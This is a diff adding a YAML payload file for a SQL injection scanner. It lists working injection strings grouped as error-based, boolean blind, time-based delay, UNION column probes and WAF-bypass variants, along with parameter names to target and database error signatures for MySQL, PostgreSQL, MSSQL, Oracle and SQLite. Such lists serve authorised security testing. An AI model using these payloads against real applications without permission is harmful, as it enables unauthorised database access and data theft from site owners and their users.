@@ -1,0 +1,110 @@
+# SQL Injection Scanner payloads
+# Organized by technique: error, blind, union, bypass
+
+error_payloads:
+  - "'"
+  - "\""
+  - "')"
+  - "))"
+  - "' OR '1'='1"
+  - "\" OR \"1\"=\"1"
+  - "1' AND 1=1--"
+  - "1' AND 1=2--"
+  - "') AND ('1'='1"
+  - "1' ORDER BY 1--"
+  - "1' ORDER BY 100--"
+
+blind_boolean_pairs:
+  - - "' AND 1=1--"
+    - "' AND 1=2--"
+  - - "' OR 'a'='a'--"
+    - "' OR 'a'='b'--"
+  - - "1 AND 1=1"
+    - "1 AND 1=2"
+  - - "' AND 'x'='x'--"
+    - "' AND 'x'='y'--"
+  - - "1' AND SUBSTRING(@@version,1,1)='5'--"
+    - "1' AND SUBSTRING(@@version,1,1)='X'--"
+
+time_payloads:
+  - "' AND SLEEP(3)--"
+  - "'; WAITFOR DELAY '0:0:3'--"
+  - "'; SELECT pg_sleep(3)--"
+  - "1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--"
+  - "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',3)--"
+
+union_payloads:
+  - "' UNION SELECT NULL--"
+  - "' UNION SELECT NULL,NULL--"
+  - "' UNION SELECT NULL,NULL,NULL--"
+  - "' UNION SELECT NULL,NULL,NULL,NULL--"
+  - "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
+  - "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--"
+  - "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--"
+  - "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--"
+
+bypass_payloads:
+  - "' /*!50000OR*/ 1=1--"
+  - "'%20OR%201=1--"
+  - "'\tOR\t1=1--"
+  - "'/**/OR/**/1=1--"
+  - "' UNION/**/SELECT NULL--"
+  - "1'/*!50000UNION*//*!50000SELECT*/NULL--"
+
+injection_params:
+  - "id"
+  - "q"
+  - "search"
+  - "page"
+  - "name"
+  - "user"
+  - "cat"
+  - "item"
+  - "product"
+  - "order"
+  - "sort"
+  - "type"
+  - "action"
+  - "debug"
+  - "test"
+  - "input"
+  - "cmd"
+  - "file"
+  - "path"
+
+db_error_patterns:
+  mysql:
+    - "You have an error in your SQL syntax"
+    - "MySqlException"
+    - "mysql_fetch"
+    - "supplied argument is not a valid MySQL"
+    - "Warning: mysql"
+    - "MySQLSyntaxErrorException"
+    - "com.mysql.jdbc"
+  postgresql:
+    - "PostgreSQL.*ERROR"
+    - "PG::SyntaxError"
+    - "pg_query"
+    - "valid PostgreSQL result"
+    - "unterminated quoted string"
+    - "PSQLException"
+  mssql:
+    - "Driver.* SQL Server"
+    - "Unclosed quotation mark"
+    - "ODBC SQL Server"
+    - "Microsoft OLE DB"
+    - "Incorrect syntax near"
+    - "SqlException"
+    - "System.Data.SqlClient"
+  oracle:
+    - "ORA-[0-9]{4,5}"
+    - "Oracle error"
+    - "Oracle.*Driver"
+    - "quoted string not properly terminated"
+    - "ORA-01756"
+  sqlite:
+    - "SQLite/JDBCDriver"
+    - "SQLITE_ERROR"
+    - "unrecognized token"
+    - "SQLite3::"
+    - "sqlite3.OperationalError"
